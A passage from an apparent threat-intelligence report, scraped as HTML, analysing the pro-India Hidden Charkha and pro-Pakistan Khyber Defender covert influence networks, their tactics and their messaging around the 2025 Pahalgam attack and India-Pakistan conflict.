href=\"https://apnews.com/article/india-farmers-protest-minimum-crop-prices-72f48ace2126ccf933675b76ff83944a\">farmer protests</a> in India. Khyber Defender activity surged on April 15, 2025, when the Washington Post <a href=\"https://www.washingtonpost.com/world/2025/04/14/afghanistan-war-weapons-pakistan-taliban-militants/\">revealed</a> that terrorist groups smuggled US weapons left in Afghanistan into Pakistan, as well as in July 2024, following Pakistani media coverage of “Operation Goldsmith,” an <a href=\"https://theprint.in/go-to-pakistan/richard-grenells-imran-chorus-grows-louder-pakistan-minister-calls-it-operation-goldsmith/2419808/\">alleged operation</a> by foreign actors to restore former Prime Minister Imran Khan. Both networks also prioritize narratives promoting national unity and counter-insurgency operations in contested regions, such as the Balochistan province and Jammu and Kashmir (J&amp;K), while undermining separatist movements operating in them.</p>\n        <p>In addition to domestic messaging, these networks also very likely support the aforementioned governments’ foreign policy and diplomatic objectives, including undermining each respective government’s rivals at global diplomatic events such as the United Nations (UN) General Assembly (UNGA). The pro-India Hidden Charkha network also likely supported <a href=\"https://www.nsicop-cpsnr.ca/reports/rp-2024-06-03/special-report-foreign-interference.pdf\">transnational repression</a> efforts by targeting Sikh separatists abroad, as well as by promoting content accusing Canada and the US of facilitating perceived Khalistani extremism.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1248b5a3e9fc5f059767261e006be9ab314467e0c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"777\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 2</em></strong><em>: Hidden Charkha and Khyber Defender daily posting since January 2024 (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>In addition to their size (over 900 inauthentic accounts affiliated with Hidden Charkha and over 300 affiliated with Khyber Defender), these networks are remarkably similar in terms of TTPs: They use hashtags to amplify content and manipulate trending topics, produce visual content inhouse, impersonate local and international news outlets, and use AI to generate content aimed at international audiences.</p>\n        <h3>Hidden Charkha</h3>\n        <p>Hidden Charkha is a covert influence network identified by Insikt Group in April 2025 disseminating pro-India influence content. We identified over 900 inauthentic accounts as part of this network, which has been active since at least 2021.

Some of the network’s most active accounts also employ AI-generated profile pictures, but obstruct faces to avoid being detected as AI-generated content, often by using veils or other kinds of objects, such as a building corner (<strong>Figures 12, 13, and 14</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_18449327e6b29a7f3f6e2bb8965e4bef3ef58cce8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"301\" height=\"152\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 10 and 11</em></strong><em>: GAN-generated profile pictures used by Hidden Charkha accounts (Source: Social Media)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1f67d4e47226c35be8a389d385962c7d1ff25893d.png?width=750&amp;format=png&amp;optimize=medium\" width=\"452\" height=\"152\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 12, 13, and 14</em></strong><em>: Similar AI-generated profile pictures used by Hidden Charkha accounts (Source: Social Media)</em></div>\n          </div>\n        </div>\n        <p>Insikt Group also identified Hidden Charkha accounts attempting to brand themselves as purported media outlets, using names such as “Daily Dose News” (@DdnDose), “NewsMasterIndia” (@NewsMasterIndia), and “NewsFreak” (@_peacekeeper2), with some accounts advertising themselves as fact-checking organizations.

Many Khyber Defender accounts have likely accrued significant followings by participating in inauthentic “follow-for-follow” networks, which involve following many accounts to receive many reciprocal followers.</p>\n        <h2>Influence Operations and Conflict Escalation</h2>\n        <p>Insikt Group assesses that Hidden Charkha and Khyber Defender both participated in influence activities aligned with India’s and Pakistan’s broader efforts to shape domestic and international public opinion and deflect blame following the Pahalgam attacks. This influence activity aligned with India and Pakistan characterized their kinetic reprisals as legitimate and proportionate, effectively attempting to assert control over conflict escalation. Based on content published during the India-Pakistan conflict between April 22 and May 15, 2025, these networks almost certainly attempted to do the following:</p>\n        <ul>\n          <li><strong>Rapidly establish control over attribution narratives over the Pahalgam attacks</strong> and legitimize claims using government and news sources</li>\n          <li><strong>Increase domestic political pressure on perceived adversarial public officials and erode trust in adversary leadership</strong> while promoting narratives of unity domestically</li>\n          <li><strong>Undermine the rival’s diplomatic standing</strong> and counter or support international media reports on the conflict</li>\n          <li><strong>Erode trust in adversary military preparedness</strong> by amplifying almost certainly forged military documents that reportedly showed a lack of morale and equipment malfunctions</li>\n          <li><strong>Frame military retaliation as justified and securing the moral high ground</strong> by promoting narratives of a disproportionate response by their adversary</li>\n          <li><strong>Drive domestic and international support for conventional kinetic operations by amplifying operational successes,</strong> establishing narratives of technological superiority, countering adversarial claims of failure, and promoting patriotic sentiment</li>\n          <li><strong>Exaggerate the impact of cyberattacks on adversary infrastructure</strong> by echoing claims from hacktivist groups and national media outlets</li>\n          <li><strong>Claim military and cyber operations as successes post-ceasefire</strong> while highlighting any ceasefire violations, undermining their adversary on the international stage, and reaffirming their own technological sophistication</li>\n        </ul>\n        <p>In spite of each network’s attempts, organic social media engagement with their campaigns during the conflict’s time period was minimal, very likely denoting a failure to effectively shape public opinion. These networks also very likely failed to escape their national media echo chambers and likely reinforced existing messaging targeting like-minded activists and patriotic actors. Additionally, based on available data, Insikt Group is unable to establish whether these networks are operating under direct government supervision or control, limiting arguments of causal links between the Indian and Pakistani governments’ strategies during the conflict and narratives published by Hidden Charkha and Khyber Defender.</p>\n        <p>Nevertheless, narratives promoted by both influence networks to support conflict escalation almost certainly demonstrate how nationalist or patriotic sentiment can align network operators with nation-state influence objectives and provide informational support in times of kinetic warfare.</p>\n        <h3>Background</h3>\n        <p>On April 22, 2025, gunmen <a href=\"https://apnews.com/article/kashmir-tourist-attack-dc7067a18899d9e7ff7726d4e05982c3\">shot and killed</a> 26 tourists at a resort near Pahalgam in India-controlled Kashmir. The attack was initially claimed by The Resistance Front (TRF), an alleged proxy of the Pakistani terrorist organization Lashkar-e-Taiba (LeT), which has been designated as a terrorist group by the <a href=\"https://www.mha.gov.in/sites/default/files/2022-08/BannedOrgOld_16032022%5B1%5D.pdf\">Indian</a>, <a href=\"http://news.bbc.co.uk/1/hi/world/south_asia/3181925.stm\">Pakistani</a>, and <a href=\"https://www.state.gov/foreign-terrorist-organizations\">US</a> governments since 2001. Initial reactions in both countries included <a href=\"https://www.csis.org/analysis/what-led-recent-crisis-between-india-and-pakistan\">deflecting blame</a> onto the other and mounting domestic political pressure to identify responsible parties in government. Diplomatic tensions soared after both countries <a href=\"https://www.dawn.com/news/1906284\">instituted</a> reciprocal diplomatic sanctions and <a href=\"https://www.deccanherald.com/india/jk-terror-attack-india-seems-to-be-building-its-case-for-striking-pakistan-3512874\">appealed</a> to foreign world leaders and international bodies.

This activity almost certainly aimed to undermine the respective government’s credibility among international audiences while simultaneously inoculating domestic audiences against hostile messaging, particularly in <a href=\"https://www.cfr.org/global-conflict-tracker/conflict/conflict-between-india-and-pakistan\">contested</a> regions like Jammu and Kashmir.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_12863c2ffde39bb92690409332a50279027f70ef2.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"775\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 23</em></strong><em>: Timeline of Hidden Charkha and Khyber Defender activity following the Pahalgam attacks</em></p>\n              <p><em>(Source: Recorded Future)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>Within two hours of the Pahalgam attacks, Hidden Charkha accounts began attributing them to Pakistan. Accounts blamed the attacks on “Pak sponsored terrorists,” using hashtags like #pahalgamattack and #TerrorStatePakistan. By April 23, 2025, Hidden Charkha accounts began posting previously unseen (and therefore likely purpose-made) visual content accusing Pakistan’s Inter-Services Intelligence (ISI) of sponsoring LeT and calling TRF a “thinly veiled proxy” of LeT (<strong>Figures 24 and 25</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1d2a147f3e1788ff665e058581b555b566e79fe99.png?width=750&amp;format=png&amp;optimize=medium\" width=\"487\" height=\"198\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figures 24 and 25</em></strong><em>: Visual content posted by Hidden Charkha accounts following the Pahalgam attacks</em></p>\n              <p><em>(Source: Recorded Future)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>On April 22, 2025, at approximately 20:43 Karachi time, Khyber Defender accounts began coordinated posting of the #indianfalseflag hashtag.

Accounts drew comparisons to the February 14, 2019, attacks in Puwalma, claiming that the two attacks were false flags and followed the “same script, same timing, same agenda.” On April 24, 2025, Khyber Defender accounts continued calling the Pahalgam attack a “scripted move” and an example of the Indian government’s “false flags, timed perfectly with global optics, to serve political agendas,” using hashtags like #IndianPropagandaExposed (<strong>Figure 26</strong>) and #IndiaFalseFlagKing (<strong>Figure 27</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1925c46e655a3d8960b1319b178cb8663306015d1.png?width=750&amp;format=png&amp;optimize=medium\" width=\"494\" height=\"250\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figures 26 and 27</em></strong><em>: Visual content posted by Khyber Defender accounts following the Pahalgam attacks</em></p>\n              <p><em>(Source: Recorded Future)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>On April 25, Khyber Defender accounts also amplified images (<strong>Figure 28</strong>) purportedly stating a denial of responsibility for the Pahalgam attacks by the TRF. The statement, originally issued on a Telegram channel allegedly operated by TRF, denies the group’s involvement in the attacks, citing a “cyber intrusion” by “Indian cyber-intelligence operatives.” Starting May 30, 2025, the Telegram channel also began publishing screenshots of likely inauthentic documents purportedly sourced from India’s Research and Analysis Wing (RAW). These documents allegedly show that the attack had been orchestrated by the Indian government.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_19b8bd162b4550d3e06c2863066b0db3a0ac532de.png?width=750&amp;format=png&amp;optimize=medium\" width=\"679\" height=\"388\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 28</em></strong><em>: Alleged statement of denial by TRF amplified by Khyber Defender accounts</em></p>\n              <p><em>(Source: Recorded Future)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>Starting April 25, both networks attempted to legitimize their attribution claims by amplifying government and news sources. Hidden Charkha accounts began posting headlines from Indian national news outlets that provided evidence attributing the attacks to Pakistan (<strong>Figures 29 and 30</strong>); however, the narrative’s credibility among international audiences was very likely <a href=\"https://www.washingtonpost.com/world/2025/06/04/india-news-channels-misinformation-pakistan-conflict/\">undermined</a> by a rising echo-chamber effect in Indian media, as outlets amplified unverified claims and suffered from circular reporting. In contrast, Khyber Defender attempted to validate its claims by repeatedly posting clips directly sourced from the Pakistan Armed Forces’ Inter-Services Public Relations (ISPR) press conferences with Director General Ahmed Shareef Chaudhry (<strong>Figure 31</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_167f24bcad08866d3b837332b82cd2037ef61d259.png?width=750&amp;format=png&amp;optimize=medium\" width=\"402\" height=\"504\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 29 and 30</em></strong><em>: Hidden Charkha content amplifying headlines from Indian news outlets reportedly confirming attribution to Pakistan (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1925c46e655a3d8960b1319b178cb8663306015d1.png?width=750&amp;format=png&amp;optimize=medium\" width=\"494\" height=\"250\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 31</em></strong><em>: Khyber Defender content amplifying ISPR press conferences (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h3>Political Pressure and National Unity</h3>\n        <p>Following the establishment of initial attribution claims, both networks attempted to erode trust in adversary leadership while simultaneously promoting unity at home and suppressing dissent from domestic political rivals.</p>\n        <p>Hidden Charkha attempted to undermine the perceived credibility of Pakistani officials by using quotes and supporting screenshots from Indian news outlets. Hidden Charkha initially amplified claims by former Pakistani officer and journalist <a href=\"https://soldierspeaks.org/about-me/\">Adil Raja</a> that Pakistan Army chief General Asim Munir had ordered the Pahalgam attacks, using screenshots of an April 24, 2025, India Today article that <a href=\"https://www.indiatoday.in/india/story/pahalgam-terror-attack-why-pakistan-army-chief-asim-munir-risking-mini-war-with-india-2714005-2025-04-24\">claimed</a> Munir was “desperate for a mini-war with India.” Other attempts to undermine General Munir included using quotes by former Pentagon official Michael Rubin <a href=\"https://www.aninews.in/news/world/us/asim-munir-osama-bin-laden-the-same-top-us-security-expert-slams-pakistan-for-its-role-in-pahalgam-attack20250424075740/\">calling</a> Munir a “terrorist” in an interview with Indian media outlet ANI. Hidden Charkha accounts later targeted Pakistan’s Minister of Defense Khawaja Asif, claiming the minister had confessed that “we [Pakistan] did the dirty work of funding &amp; training terrorists for 3 decades.\"</p>\n        <p>On April 25, Khyber Defender accounts began targeting India’s National Security Advisor Ajit Doval using the hashtag #sackajitdoval, claiming that the Pahalgam attacks were an “intelligence disaster” for India and that “there are increasing calls for Ajit Doval and his colleagues to step down.” The network’s narratives almost certainly attempted to capitalize on mounting domestic criticism in the aftermath of the attacks, such as from the Shiv Sena (UBT) party, which also <a href=\"https://www.deccanherald.com/india/jammu-and-kashmir/jammu-and-kashmir-terror-attack-an-intelligence-failure-article-370-move-has-not-ended-violence-shiv-sena-ubt-3508226\">qualified</a> the Pahalgam attacks as an “intelligence failure” and criticized Doval on April 24, 2025.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1b66b4aec670ac62828ed2051474830fa75d6aae4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"398\" height=\"201\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 32 and 33</em></strong><em>: Khyber Defender content calling for Ajit Doval to be fired (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>While mounting pressure on adversary public officials, the networks simultaneously began posting narratives promoting unity, patriotism, and nationalist sentiment in their respective countries. Hidden Charkha, for example, focused on highlighting national and regional unity by posting content using hashtags like #KashmirRejectsTerrorism and #StandWithIndia, as well as visual content promoting unity in J&amp;K using the #jmukmr hashtag (<strong>Figure 34</strong>). Conversely, Khyber Defender accounts amplified official messages from Pakistani officials like General Munir’s “Pakistan Hamesha Zindabad” (“Pakistan Forever Alive”) slogan, or images of national unity using hashtags like #Pakistan_is_our_pride (<strong>Figure 35</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_194c8c5db7b34f7b594325d2f01798a1a42c3fa78.png?width=750&amp;format=png&amp;optimize=medium\" width=\"351\" height=\"403\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figures 34 and 35:</strong> Hidden Charkha (left) and Khyber Defender (right) content promoting regional unity and nationalist sentiment (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Conversely, both networks also sought to suppress dissent by questioning the loyalty of domestic political rivals. For instance, Hidden Charkha promoted the #राहुल_देशद्रोही_है (“Rahul is a traitor”) hashtag to label Rahul Gandhi, the <a href=\"https://inc.in/leadership/past-party-presidents/shri-rahul-gandhi\">opposition leader</a> in India’s Lok Sabha house of parliament, a terrorist “sympathizer.” This narrative mirrors the animosity of the Bharatiya Janata Party (BJP) toward Gandhi, with BJP spokesman Pradeep Bhandari accusing Gandhi of “undermining India’s progress” in December 2024. Similarly, Khyber Defender accounts used the hashtag #PTM_Supports_Terrorism to accuse the Pashtun Tahafuz Movement (PTM), a human rights organization <a href=\"https://docs.un.org/en/A/HRC/51/NGO/34\">defending</a> Pashtun rights in Pakistan, of supporting Indian narratives on the Pahalgam attacks and called on Pashtuns to support Pakistan by stating “Proud Pashtun brothers! Understand the game of the enemies and support your state.”</p>\n        <h3>Diplomatic Escalation and Media Reactions</h3>\n        <p>Governments typically use bilateral or multilateral diplomatic statements and communications during emerging conflicts as a mechanism for de-escalation or signalling foreign policy intent. Governments will hold press conferences or issue public statements, and they are increasingly using social media to promote these communications. Covert influence operations targeting social media users are likewise <a href=\"https://direct.mit.edu/ngtn/article/37/1/83/121465/Social-Media-Influence-on-Diplomatic-Negotiation\">increasingly being used</a> to shape narratives and drive diplomatic outcomes, particularly as diplomats themselves have been leveraged by nation-states like <a href=\"https://www.irsem.fr/report.html\">China</a> and <a href=\"https://www.politico.eu/article/russia-diplomats-disinformation-war-ukraine/\">Russia</a> as part of their broader influence ecosystems.</p>\n        <p>Both Hidden Charkha and Khyber Defender demonstrated a strong intent to shape international public opinion and promote their respective countries’ diplomatic standing while undermining the opposite country. Hidden Charkha was almost certainly more proactive than Khyber Defender in amplifying influence content signalling diplomatic escalation, reflecting India’s retaliatory measures in the immediate aftermath of the Pahalgam attack, while the latter kept a more reactive approach to India’s diplomatic actions.</p>\n        <p>On April 23, 2025, diplomatic tensions between India and Pakistan rapidly <a href=\"https://www.theguardian.com/world/2025/apr/29/farmers-pakistan-indus-waters-treaty-india\">escalated</a> following India's decision to suspend the 1960 Indus Waters Treaty (IWT), among other measures like visa bans and border closures. The treaty, which governs water distribution between India and Pakistan in the Indus river basin, was <a href=\"https://www.ndtv.com/world-news/india-suspends-indus-water-treaty-with-pakistan-day-after-pahalgam-terror-attack-that-killed-26-8238399\">declared</a> a national security risk by Indian Foreign Secretary Vikram Misri after the Pahalgam attack. Following the IWT suspension, both networks attempted to appeal to international audiences and international diplomatic bodies; however, Hidden Charkha displayed greater intent to undermine Pakistan at diplomatic forums like the UN Security Council (UNSC).</p>\n        <p>Hidden Charkha accounts initially amplified Foreign Secretary Misri’s announcement of the measures as “decisive” action by the Indian government (<strong>Figure 36</strong>). Meanwhile, Khyber Defender accounts reacted strongly against the suspension of the IWT, amplifying Pakistani government statements that the move <a href=\"https://www.app.com.pk/national/senate-body-slams-indian-violations-of-iwt-terms-water-aggression-a-red-line-for-pakistan/\">was</a> a “red line” and a “direct threat” to Pakistan (<strong>Figure 37</strong>), echoing an April 24, 2025, statement by Pakistan’s National Security Committee <a href=\"https://www.aljazeera.com/news/2025/4/24/kashmir-attack-does-indias-indus-waters-treaty-freeze-threaten-pakistan\">calling</a> the decision an “act of war.” Khyber Defender accounts also attempted to frame the treaty’s suspension as India violating international norms, stating that “It's time the global community took notice” and using the hashtag #indiaemptythreats.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_10b7eb7c925f399a40e037934241552719550e0c4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"493\" height=\"248\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 36 and 37</em></strong><em>: Hidden Charkha (left) content covering India’s diplomatic measures and Khyber Defender (right) Urdu-language content framing the IWT suspension as contrary to international norms (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Hidden Charkha was particularly focused on undermining Pakistan’s standing at the UN, a tactic not generally observed by Khyber Defender accounts regarding India. Starting April 30, 2025, Hidden Charkha accounts accused Pakistan’s Foreign Minister Ishaq Dar of pressuring the UNSC to drop mentions of TRF from an official statement on the Pahalgam attacks (<strong>Figure 38</strong>). On May 5, 2025, following Pakistan’s <a href=\"https://x.com/PakistanUN_NY/status/1919147718464696646\">demand</a> for a closed-door consultation at the UNSC, Hidden Charkha accounts attempted to undermine Pakistan’s appeal to the UNSC over India’s suspension of the IWT, accusing it of “playing the victim.” On May 9, the pro-India network claimed that the UNSC had “rejected Pakistan’s false flag narrative,” and published likely inauthentic images depicting world leaders declaring their support for India as well as content using the hashtag #TerrorHasNoBorders (<strong>Figure 39</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1893f39c245a22deadae326306a0611166a95c298.png?width=750&amp;format=png&amp;optimize=medium\" width=\"601\" height=\"200\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 38 and 39</em></strong><em>: Hidden Charkha content seeking to undermine Pakistan at the UNSC (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>In tandem with posting content aimed at supporting diplomatic measures by each country, the networks also reacted to international reporting on the emerging conflict. Of the two networks, Hidden Charkha also adopted a more aggressive stance against international media reporting by using the #stopwhitewashing and #MediaBias hashtags to accuse international media outlets, including the New York Times, Al Jazeera, and BBC, of naming the Pahalgam attackers “militants” — instead of terrorists –– thereby legitimizing the TRF’s attack. In contrast, Khyber Defender accounts praised the New York Times’ coverage of General Munir, by stating, for example, that the May 5, 2025, <a href=\"https://www.nytimes.com/2025/05/05/world/asia/pakistan-india-asim-munir.html\">article</a> by the newspaper was “absolutely correct.”</p>\n        <h3>Military Preparedness and Forged Documents</h3>\n        <p>Following initial attribution claims and escalating diplomatic tensions, Khyber Defender focused on eroding the Indian public’s trust in New Delhi’s military preparedness by circulating almost certainly forged documents. Starting April 28, 2025, Khyber Defender accounts amplified alleged leaked documents from the Indian Integrated Defense Staff headquarters reporting on the Indian Army’s reportedly low morale and increasing desertion rates (<strong>Figure 40</strong>). On May 5, 2025, Khyber Defender accounts amplified alleged leaked documents from India’s Defense and Research and Development Organization’s (DRDO) <a href=\"https://www.drdo.gov.in/drdo/labs-and-establishments/armament-research-development-establishment-arde\">Armament Research and Development Establishment (ARDE)</a> questioning the “operational efficacy” of the 881 Missile Regiment’s BrahMos cruise missiles due to gross negligence in storage conditions (<strong>Figure 41</strong>). Both documents are almost certainly inauthentic and make verifiably false or non-credible claims, such as that “Israeli Troops” operating Indian Air Force (IAF) equipment was undermining morale or that “any uncontrolled escalation has the potential to set [our] own economy back by 50 years.”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1e64ccfb90b7c182c8923dbb06353863e7a236aed.png?width=750&amp;format=png&amp;optimize=medium\" width=\"494\" height=\"298\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 40 and 41</em></strong><em>: Images claiming to depict leaked Indian defense documents, amplified by Khyber Defender accounts (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Insikt Group assesses that the first known source of the documents is likely an anonymous pro-Pakistani social media account (@War_Analysts), which posted at least one of the two documents (<strong>Figure 41</strong>) before the Khyber Defender accounts. The account also published other likely inauthentic documents, such as a diplomatic complaint <a href=\"https://archive.is/f1hyy\">from</a> the Israeli Embassy in New Delhi to the Indian government over an alleged case of sexual assault by Indian Special Forces on a member of the Israeli Defence Forces during a military exercise, a report <a href=\"https://archive.is/WDVdm\">alerting</a> to T-90 ammunition shortages in the Indian Army, and an emergency procurement <a href=\"https://archive.is/Sax6e\">request</a> for AK-203 rifles and other equipment from Russia.</p>\n        <h3>Supporting Kinetic Escalation</h3>\n        <p>On May 7, 2025, India began Operation Sindoor, which involved missile and airstrikes on <a href=\"https://www.reuters.com/world/asia-pacific/multiple-loud-explosions-heard-pakistani-kashmir-reuters-witness-2025-05-06/\">suspected</a> terrorist (including LeT) infrastructure in Pakistan-administered Kashmir and Punjab, Pakistan. On May 10, 2025, Pakistan <a href=\"https://www.aljazeera.com/news/2025/5/10/pakistan-launches-operation-bunyan-marsoos-what-we-know-so-far\">responded</a> with Operation Bunyan-Al-Marsous, which targeted Indian military installations in Northern India. In tandem with these conventional kinetic operations, both Hidden Charkha and Khyber Defender increased their operational tempo (<strong>Figure 42</strong>) and attempted to support specific armed forces by publishing content almost certainly intended to justify military action, deter further kinetic actions by establishing perceived technological superiority, and forge patriotic sentiment.</p>\n        <p>Operation Sindoor <a href=\"https://www.internationalaffairs.org.au/australianoutlook/pulwama-terror-india-escalates/\">represented</a> a major expansion from India's last kinetic actions against Pakistan in response to the 2019 Pulwama terror attack, and New Delhi very likely sought to calibrate its operations to minimize chances of uncontrolled escalation. Conversely, Pakistan –– which has suffered <a href=\"https://www.aljazeera.com/news/2025/5/9/india-pakistan-tensions-a-brief-history-of-conflict\">repeated</a> military defeats against its more <a href=\"https://www.aljazeera.com/news/2025/6/10/pakistan-ramps-up-defence-spending-by-20-percent-after-india-conflict\">well-equipped</a> neighbor –– very likely sought to capitalize on battlefield successes to present itself as a peer adversary not easily deterred. During the conflict, Hidden Charkha portrayed Operation Sindoor as precise, internationally supported, and strategically restrained, which Khyber Defender countered with claims of Indian losses and Pakistan’s retaliatory capabilities during Operation Bunyan-Al-Marsous. Both networks emphasized technological superiority and weapon precision to support public perceptions of tactical restraint. They did this by promoting each respective country’s weapons’ effectiveness while discrediting the other country’s systems in an attempt to paint retaliatory strikes as disproportionate and indiscriminate. Accounts consistently highlighted the precision of their respective country’s military attacks, as well as any civilian casualties inflicted by the adversary, by sharing images and footage of military strikes, likely to complicate battle damage assessments and downplay the impact of the other country’s actions, while appealing to international audiences and strengthening patriotic sentiment domestically.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1248b5a3e9fc5f059767261e006be9ab314467e0c.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"777\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 42</em></strong><em>: Increased operational tempo by both networks following kinetic escalation (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h4>Initial Escalation and Retaliatory Framing</h4>\n        <p>Prior to the launch of Operation Sindoor, both networks documented rising military escalation along the LoC in J&amp;K.

Starting May 7, 2025, the network lauded the effectiveness of India’s Akash and SCALP missiles, Dassault Rafale fighter jets, and Bofors L-70 and Zu-23mm anti-aircraft guns. The network also issued strong denials to counter initial Pakistani media reports that Pakistani forces shot down Indian Rafales. The network also highlighted Pakistan’s loss of military equipment. On May 8, 2025, Hidden Charkha began posting claims that Indian S-400 air defense systems had downed two Pakistani JF-17s and a J-20C. The network later amplified reports of Pakistani equipment being destroyed, such as an AWACS aircraft and an F-16 squadron at Bholari airbase and Shapar and Bayraktar drones at Murid airbase, in addition to claiming that Chinese-made missiles, such as PL-15 and HQ-9 air-to-air missiles, were ineffective (<strong>Figure 47</strong>).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_10b26571802c877c9baa38e62311ed9e46676e352.png?width=750&amp;format=png&amp;optimize=medium\" width=\"350\" height=\"402\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 47 and 48</em></strong><em>: Images shared by Hidden Charkha covering Operation Sindoor (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <p>Following Operation Sindoor, Hidden Charkha amplified narratives painting the military operation as a justified escalation and proportional response to the Pahalgam attack. On May 12, 2025, Hidden Charkha accounts amplified graphics posted by the Indian Ministry of Defense (MoD) Additional Directorate General of Public Information (ADG-PI) on social media, with accounts claiming that “India showed exemplary Strategic Restraint. #OperationSindoor was powerful yet measured, targeting only terror infrastructures, avoiding escalation.” Other accounts posted content claiming that Operation Sindoor had international approval, including sharing graphics originally from Indian news outlets that <a href=\"https://www.youtube.com/watch?v=40G1zcgJ8Sc\">claimed</a> US Secretary of Defense Pete Hegseth “backed” Operation Sindoor (<strong>Figure 49</strong>), <a href=\"https://www.instagram.com/p/DJYfEbiM0er/\">as well as</a> Afghanistan’s former Vice President Amrullah Saleh (<strong>Figure 50</strong>). Hidden Charkha likely attempted to amplify nationalist sentiment during Operation Sindoor by consistently using the hashtags #pahalgamavenged and #satyamevjayate, with the latter <a href=\"https://www.mha.gov.in/en/document/advisory-related-display-of-complete-state-emblem-of-india-motto-satyameva-jayate-truth\">being</a> India’s official national motto (“truth alone triumphs”).</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_193ed7640f74b421d860ddc1d405ce660784b3201.png?width=750&amp;format=png&amp;optimize=medium\" width=\"529\" height=\"249\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figures 49 and 50</em></strong><em>: Graphics published by Hidden Charkha accounts justifying Operation Sindoor</em></p>\n              <p><em>(Source: Recorded Future)</em></p>\n            </div>\n          </div>\n        </div>\n        <p>In line with the network’s previous aggressive stance toward international media, at least one account posted an attempted community note in response to French media outlet France24, claiming that its reporting attempted to “protect the reputation of China’s rotten and outdated weapons.” On May 20, 2025, Hidden Charkha accounts posted content celebrating Operation Sindoor as a success, <a href=\"https://www.khushalekashmir.com/index.php/2025/05/19/bjp-holds-tiranga-rally-on-srinagar-baramulla-national-highway-to-celebrate-operation-sindoor/\">dubbing</a> a BJP rally in Baramulla (located in India-controlled J&amp;K) a “shining moment of unity, patriotism, and victory,” very likely attempting to reinforce patriotic narratives among audiences in contested regions.</p>\n        <p>During the early stages of Operation Sindoor, Khyber Defender accounts very likely attempted to capitalize on Pakistan’s <a href=\"https://observers.france24.com/en/asia-pacific/20250512-india-pakistan-conflict-rafale-fighter-jets-shot-down-images-debunked\">alleged downing</a> of Rafales and Israeli drones to spring counter-claims undermining Indian narratives of technological superiority (calling India’s claims “big talk” and a “bluff”) and attract international attention to the conflict. Starting May 7, 2025, Khyber Defender began posting content covering the reported downing of Indian Rafales by the PAF using PL-15 missiles (<strong>Figure 51</strong>), as well as amplified alleged imagery of the wreckage.

